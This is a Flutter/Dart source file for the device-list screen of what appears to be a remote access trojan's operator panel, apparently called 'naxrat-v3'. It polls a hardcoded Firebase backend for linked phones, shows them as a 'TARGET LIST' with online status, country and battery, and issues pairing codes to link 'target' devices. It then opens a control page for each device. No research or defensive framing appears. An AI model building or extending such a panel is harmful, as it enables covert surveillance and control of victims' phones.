// ═══════════════════════════════════════════════════════════════════════════
//  DEVICES PAGE — FIXED (DEVICE PASTI MUNCUL)
// ═══════════════════════════════════════════════════════════════════════════
import 'dart:async';
import 'dart:convert';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;

import 'control_page.dart';

const String kFirebaseUrl = 'https://naxrat-v3-default-rtdb.firebaseio.com';

// ── PALETTE PUTIH-BIRU 3D ──
const Color kBg = Color(0xFFEEF3F9);
const Color kBgGrad1 = Color(0xFFF5FAFF);
const Color kBgGrad2 = Color(0xFFE6EEF8);
const Color kCard = Color(0xFFFFFFFF);
const Color kCardAlt = Color(0xFFF5F9FF);
const Color kBorder = Color(0xFFD6E2F0);
const Color kBorderMid = Color(0xFFC3D4E8);
const Color kIce = Color(0xFF38BDF8);
const Color kIce2 = Color(0xFF0EA5E9);
const Color kIce3 = Color(0xFF0284C7);
const Color kIceSoft = Color(0xFFE0F2FE);
const Color kText = Color(0xFF0A2540);
const Color kTextSub = Color(0xFF4A6582);
const Color kTextDim = Color(0xFF8FA5BE);
const Color kGreen = Color(0xFF10B981);
const Color kGreenSoft = Color(0xFFECFDF5);
const Color kRed = Color(0xFFEF4444);
const Color kRedSoft = Color(0xFFFFF1F2);
const Color kAmber = Color(0xFFF59E0B);

final List<BoxShadow> _sh1 = [
  BoxShadow(color: kText.withOpacity(0.06), blurRadius: 2, offset: const Offset(0, 1)),
  BoxShadow(color: kText.withOpacity(0.04), blurRadius: 4, offset: const Offset(0, 2)),
  BoxShadow(color: kIce.withOpacity(0.06), blurRadius: 8, offset: const Offset(0, 4)),
];
final List<BoxShadow> _shPrimary = [
  BoxShadow(color: kIce.withOpacity(0.40), blurRadius: 12, offset: const Offset(0, 4)),
  BoxShadow(color: kIce.withOpacity(0.25), blurRadius: 24, offset: const Offset(0, 8)),
  BoxShadow(color: kIce.withOpacity(0.15), blurRadius: 48, offset: const Offset(0, 16)),
];

class DeviceModel {
  final String id;
  final String name;
  final int? battery;
  final String country;
  final bool online;
  final int lastSeen;

  DeviceModel({
    required this.id,
    required this.name,
    required this.battery,
    required this.country,
    required this.online,
    required this.lastSeen,
  });
}

class DevicesPage extends StatefulWidget {
  final String username;
  final String sessionKey;

  const DevicesPage({
    super.key,
    required this.username,
    required this.sessionKey,
  });

  @override
  State<DevicesPage> createState() => _DevicesPageState();
}

class _DevicesPageState extends State<DevicesPage> {
  List<DeviceModel> _devices = [];
  bool _isLoading = true;
  String? _pairingCode;
  bool _isGenerating = false;
  Timer? _refreshTimer;

  @override
  void initState() {
    super.initState();
    _loadDevices();
    _refreshTimer = Timer.periodic(const Duration(seconds: 3), (_) => _loadDevices());
  }

  @override
  void dispose() {
    _refreshTimer?.cancel();
    super.dispose();
  }

  Future<void> _generatePairingCode() async {
    if (_isGenerating) return;
    setState(() => _isGenerating = true);

    final rand = Random.secure();
    final code = List.generate(6, (_) => rand.nextInt(10)).join();

    try {
      final url = Uri.parse('$kFirebaseUrl/pair_codes/$code.json');
      final res = await http.put(
        url,
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'admin_id': widget.username,
          'created_at': DateTime.now().millisecondsSinceEpoch,
          'used': false,
        }),
      );

      if (res.statusCode == 200 || res.statusCode == 204) {
        setState(() {
          _pairingCode = code;
          _isGenerating = false;
        });
        await Clipboard.setData(ClipboardData(text: code));
        _showSnack('CODE $code COPIED!', success: true);
      } else {
        setState(() => _isGenerating = false);
        _showSnack('FAILED TO GENERATE (HTTP ${res.statusCode})', error: true);
      }
    } catch (e) {
      setState(() => _isGenerating = false);
      _showSnack('ERROR: $e', error: true);
    }
  }

  Future<void> _loadDevices() async {
    try {
      final res = await http.get(Uri.parse('$kFirebaseUrl/devices.json'))
          .timeout(const Duration(seconds: 10));

      if (res.statusCode != 200) return;
      final data = jsonDecode(res.body);
      if (data == null) {
        if (mounted) setState(() { _devices = []; _isLoading = false; });
        return;
      }

      final now = DateTime.now().millisecondsSinceEpoch;
      final adminId = widget.username.toLowerCase(); // ✅ Lowercase
      final list = <DeviceModel>[];

      (data as Map<String, dynamic>).forEach((id, raw) {
        if (raw == null) return;
        final d = raw as Map<String, dynamic>;

        // ✅ FIX: Filter case-insensitive, dan kalau kosong tetap masuk
        final rawAdmin = (d['admin_id'] ?? '').toString().toLowerCase();
        final rawParent = (d['parent'] ?? '').toString().toLowerCase();
        final isMine = rawAdmin == adminId || rawParent == adminId;

        // ✅ Kalau BUKAN punya lu, skip
        if (!isMine) return;

        int lastSeen = 0;
        final rawSeen = d['last_seen'];
        if (rawSeen is int) lastSeen = rawSeen;
        else if (rawSeen is String) lastSeen = int.tryParse(rawSeen) ?? 0;

        final online = lastSeen > 0 && (now - lastSeen) < 300000;

        int? battery;
        if (d['battery'] is int) battery = d['battery'];
        else if (d['battery'] is double) battery = (d['battery'] as double).toInt();

        list.add(DeviceModel(
          id: id,
          name: d['name']?.toString() ?? 'Unknown Device',
          battery: battery,
          country: d['country']?.toString() ?? '—',
          online: online,
          lastSeen: lastSeen,
        ));
      });

      list.sort((a, b) {
        if (a.online && !b.online) return -1;
        if (!a.online && b.online) return 1;
        return b.lastSeen.compareTo(a.lastSeen);
      });

      if (mounted) {
        setState(() {
          _devices = list;
          _isLoading = false;
        });
      }
    } catch (e) {
      if (mounted) setState(() => _isLoading = false);
    }
  }

  void _showSnack(String msg, {bool error = false, bool success = false}) {
    if (!mounted) return;
    final color = error ? kRed : (success ? kGreen : kIce2);
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: kCard,
      content: Row(
        children: [
          Icon(error ? Icons.error_outline : Icons.check_circle_outline, color: color, size: 20),
          const SizedBox(width: 10),
          Expanded(child: Text(msg, style: TextStyle(color: color, fontWeight: FontWeight.bold, fontSize: 12, letterSpacing: 1))),
        ],
      ),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12), side: BorderSide(color: kBorder, width: 1.5)),
      margin: const EdgeInsets.all(16),
    ));
  }

  String _timeAgo(int ts) {
    if (ts == 0) return '—';
    final diff = DateTime.now().millisecondsSinceEpoch - ts;
    if (diff < 60000) return 'BARU SAJA';
    final min = diff ~/ 60000;
    if (min < 60) return '$min MNT LALU';
    final hr = min ~/ 60;
    if (hr < 24) return '$hr JAM LALU';
    return '${hr ~/ 24} HARI LALU';
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: kBg,
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            colors: [kBgGrad1, kBg, kBgGrad2],
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
          ),
        ),
        child: SafeArea(
          child: Column(
            children: [
              _buildAppBar(),
              Expanded(
                child: RefreshIndicator(
                  onRefresh: _loadDevices,
                  color: kIce2,
                  child: ListView(
                    physics: const AlwaysScrollableScrollPhysics(parent: BouncingScrollPhysics()),
                    padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
                    children: [
                      _buildPairingCard(),
                      const SizedBox(height: 24),
                      _buildSectionHeader(),
                      const SizedBox(height: 12),
                      if (_isLoading)
                        const Center(child: Padding(padding: EdgeInsets.all(20), child: CircularProgressIndicator(color: kIce2)))
                      else if (_devices.isEmpty)
                        _buildEmptyState()
                      else
                        ..._devices.map((d) => _buildDeviceCard(d)),
                    ],
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildAppBar() {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
      child: Row(
        children: [
          GestureDetector(
            onTap: () => Navigator.pop(context),
            child: Container(
              width: 42, height: 42,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: kCard,
                border: Border.all(color: kBorder),
                boxShadow: _sh1,
              ),
              child: const Icon(Icons.arrow_back_rounded, color: kText, size: 20),
            ),
          ),
          const SizedBox(width: 14),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text('TARGET LIST', style: TextStyle(color: kText, fontFamily: 'Orbitron', fontWeight: FontWeight.w900, fontSize: 16, letterSpacing: 2)),
                Text('Admin: ${widget.username}', style: const TextStyle(color: kTextDim, fontSize: 11, fontWeight: FontWeight.w600)),
              ],
            ),
          ),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
            decoration: BoxDecoration(
              color: kGreenSoft,
              borderRadius: BorderRadius.circular(8),
              border: Border.all(color: kGreen.withOpacity(0.4)),
            ),
            child: const Text('ONLINE', style: TextStyle(color: kGreen, fontSize: 10, fontWeight: FontWeight.w900, letterSpacing: 1)),
          ),
        ],
      ),
    );
  }

  Widget _buildPairingCard() {
    return Container(
      decoration: BoxDecoration(
        color: kCard,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: kBorder, width: 1.5),
        boxShadow: _sh1,
      ),
      padding: const EdgeInsets.all(18),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          Row(
            children: [
              Container(
                padding: const EdgeInsets.all(12),
                decoration: BoxDecoration(
                  color: kAmber.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(12),
                  border: Border.all(color: kAmber.withOpacity(0.3)),
                ),
                child: const Icon(Icons.qr_code_2_rounded, color: kAmber, size: 26),
              ),
              const SizedBox(width: 14),
              const Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text('PAIRING CODE', style: TextStyle(color: kText, fontSize: 15, fontWeight: FontWeight.w900, fontFamily: 'Orbitron', letterSpacing: 1)),
                    SizedBox(height: 4),
                    Text('Generate code to link target device', style: TextStyle(color: kTextSub, fontSize: 11)),
                  ],
                ),
              ),
            ],
          ),
          const SizedBox(height: 20),
          
          if (_pairingCode != null) ...[
            Container(
              padding: const EdgeInsets.symmetric(vertical: 20),
              decoration: BoxDecoration(
                color: kBg,
                borderRadius: BorderRadius.circular(16),
                border: Border.all(color: kIce2, width: 2),
                boxShadow: [BoxShadow(color: kIce.withOpacity(0.2), blurRadius: 15)],
              ),
              child: Center(
                child: Text(
                  _pairingCode!,
                  style: const TextStyle(
                    color: kIce3,
                    fontWeight: FontWeight.w900,
                    fontSize: 42,
                    letterSpacing: 14,
                    fontFamily: 'ShareTechMono',
                  ),
                ),
              ),
            ),
            const SizedBox(height: 14),
            Row(
              children: [
                Expanded(
                  child: GestureDetector(
                    onTap: () {
                      Clipboard.setData(ClipboardData(text: _pairingCode!));
                      _showSnack('CODE COPIED!', success: true);
                    },
                    child: Container(
                      padding: const EdgeInsets.symmetric(vertical: 14),
                      decoration: BoxDecoration(
                        color: kGreenSoft,
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: kGreen.withOpacity(0.4), width: 1.5),
                      ),
                      child: const Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Icon(Icons.copy_rounded, color: kGreen, size: 18),
                          SizedBox(width: 8),
                          Text('COPY', style: TextStyle(color: kGreen, fontSize: 12, fontWeight: FontWeight.w900, letterSpacing: 1)),
                        ],
                      ),
                    ),
                  ),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: GestureDetector(
                    onTap: () => setState(() => _pairingCode = null),
                    child: Container(
                      padding: const EdgeInsets.symmetric(vertical: 14),
                      decoration: BoxDecoration(
                        color: kRedSoft,
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: kRed.withOpacity(0.4), width: 1.5),
                      ),
                      child: const Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Icon(Icons.close_rounded, color: kRed, size: 18),
                          SizedBox(width: 8),
                          Text('TUTUP', style: TextStyle(color: kRed, fontSize: 12, fontWeight: FontWeight.w900, letterSpacing: 1)),
                        ],
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ] else
            GestureDetector(
              onTap: _isGenerating ? null : _generatePairingCode,
              child: Container(
                padding: const EdgeInsets.symmetric(vertical: 16),
                decoration: BoxDecoration(
                  gradient: _isGenerating ? null : const LinearGradient(colors: [kIce, kIce2, kIce3], begin: Alignment.centerLeft, end: Alignment.centerRight),
                  color: _isGenerating ? kCardAlt : null,
                  borderRadius: BorderRadius.circular(14),
                  boxShadow: _isGenerating ? [] : _shPrimary,
                ),
                child: Center(
                  child: _isGenerating
                      ? const SizedBox(width: 22, height: 22, child: CircularProgressIndicator(color: kIce2, strokeWidth: 2))
                      : const Text('GENERATE CODE', style: TextStyle(fontSize: 14, fontWeight: FontWeight.w900, color: Colors.white, letterSpacing: 2)),
                ),
              ),
            ),
        ],
      ),
    );
  }

  Widget _buildSectionHeader() {
    return Row(
      mainAxisAlignment: MainAxisAlignment.spaceBetween,
      children: [
        const Row(
          children: [
            Icon(Icons.devices_rounded, color: kIce2, size: 20),
            SizedBox(width: 8),
            Text('ACTIVE DEVICES', style: TextStyle(color: kText, fontFamily: 'Orbitron', fontWeight: FontWeight.w900, fontSize: 14, letterSpacing: 1)),
          ],
        ),
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
          decoration: BoxDecoration(
            color: kIceSoft,
            borderRadius: BorderRadius.circular(6),
            border: Border.all(color: kIce.withOpacity(0.4)),
          ),
          child: Text('${_devices.length} LINKED', style: const TextStyle(fontSize: 10, color: kIce3, fontWeight: FontWeight.w800, letterSpacing: 1)),
        ),
      ],
    );
  }

  Widget _buildEmptyState() {
    return Container(
      padding: const EdgeInsets.all(30),
      decoration: BoxDecoration(
        color: kCard,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: kBorder, width: 1.5),
      ),
      child: const Column(
        children: [
          Icon(Icons.radar_rounded, color: kTextDim, size: 54),
          SizedBox(height: 16),
          Text('TIDAK ADA TARGET', style: TextStyle(color: kText, fontSize: 16, fontWeight: FontWeight.w900, fontFamily: 'Orbitron', letterSpacing: 1)),
          SizedBox(height: 8),
          Text('Generate pairing code dan masukkan ke device target untuk memulai koneksi.', textAlign: TextAlign.center, style: TextStyle(color: kTextSub, fontSize: 11, height: 1.5)),
        ],
      ),
    );
  }

  Widget _buildDeviceCard(DeviceModel d) {
    final batt = d.battery ?? 0;
    final battColor = batt > 50 ? kGreen : (batt > 20 ? kAmber : kRed);
    final statusColor = d.online ? kGreen : kRed;
    final statusSoft = d.online ? kGreenSoft : kRedSoft;

    return GestureDetector(
      onTap: () {
        HapticFeedback.mediumImpact();
        Navigator.push(
          context,
          MaterialPageRoute(
            builder: (_) => ControlPage(
              deviceId: d.id,
              deviceName: d.name,
              username: widget.username,
              sessionKey: widget.sessionKey,
            ),
          ),
        );
      },
      child: Container(
        margin: const EdgeInsets.only(bottom: 14),
        decoration: BoxDecoration(
          color: kCard,
          borderRadius: BorderRadius.circular(18),
          border: Border.all(color: kBorder, width: 1.5),
          boxShadow: _sh1,
        ),
        child: ClipRRect(
          borderRadius: BorderRadius.circular(16.5),
          child: Container(
            decoration: BoxDecoration(
              border: Border(left: BorderSide(color: statusColor, width: 6)),
            ),
            padding: const EdgeInsets.all(16),
            child: Column(
              children: [
                Row(
                  children: [
                    Container(
                      width: 50, height: 50,
                      decoration: BoxDecoration(
                        color: statusSoft,
                        borderRadius: BorderRadius.circular(12),
                        border: Border.all(color: statusColor.withOpacity(0.4), width: 1.5),
                      ),
                      child: Icon(Icons.phone_android_rounded, color: statusColor, size: 26),
                    ),
                    const SizedBox(width: 14),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            d.name.toUpperCase(),
                            maxLines: 1,
                            overflow: TextOverflow.ellipsis,
                            style: const TextStyle(color: kText, fontSize: 15, fontWeight: FontWeight.w900, letterSpacing: 0.5),
                          ),
                          const SizedBox(height: 6),
                          Row(
                            children: [
                              Container(
                                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                                decoration: BoxDecoration(
                                  color: statusColor,
                                  borderRadius: BorderRadius.circular(6),
                                ),
                                child: Text(
                                  d.online ? 'ONLINE' : 'OFFLINE',
                                  style: const TextStyle(color: Colors.white, fontSize: 9, fontWeight: FontWeight.w900, letterSpacing: 1),
                                ),
                              ),
                              const SizedBox(width: 8),
                              Text(d.country.toUpperCase(), style: const TextStyle(color: kTextSub, fontSize: 10, fontWeight: FontWeight.w700)),
                            ],
                          )
                        ],
                      ),
                    ),
                    Container(
                      padding: const EdgeInsets.all(8),
                      decoration: BoxDecoration(
                        color: kCardAlt,
                        shape: BoxShape.circle,
                        border: Border.all(color: kBorder),
                      ),
                      child: const Icon(Icons.chevron_right_rounded, color: kTextSub, size: 20),
                    ),
                  ],
                ),
                
                const SizedBox(height: 16),
                const Divider(color: kBorder, height: 1, thickness: 1.2),
                const SizedBox(height: 12),
                
                Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                      decoration: BoxDecoration(color: kCardAlt, borderRadius: BorderRadius.circular(6), border: Border.all(color: kBorder)),
                      child: Row(
                        children: [
                          const Icon(Icons.access_time_rounded, size: 12, color: kTextSub),
                          const SizedBox(width: 4),
                          Text(_timeAgo(d.lastSeen), style: const TextStyle(color: kTextSub, fontSize: 10, fontWeight: FontWeight.w700)),
                        ],
                      ),
                    ),
                    const Spacer(),
                    if (d.battery != null)
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                        decoration: BoxDecoration(color: battColor.withOpacity(0.1), borderRadius: BorderRadius.circular(6), border: Border.all(color: battColor.withOpacity(0.4))),
                        child: Row(
                          children: [
                            Icon(Icons.battery_full_rounded, size: 14, color: battColor),
                            const SizedBox(width: 4),
                            Text('$batt%', style: TextStyle(color: battColor, fontSize: 11, fontWeight: FontWeight.w900)),
                          ],
                        ),
                      )
                    else
                      Container(
                        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                        decoration: BoxDecoration(color: kCardAlt, borderRadius: BorderRadius.circular(6), border: Border.all(color: kBorder)),
                        child: const Text('PWR: ??', style: TextStyle(color: kTextDim, fontSize: 10, fontWeight: FontWeight.w900)),
                      ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}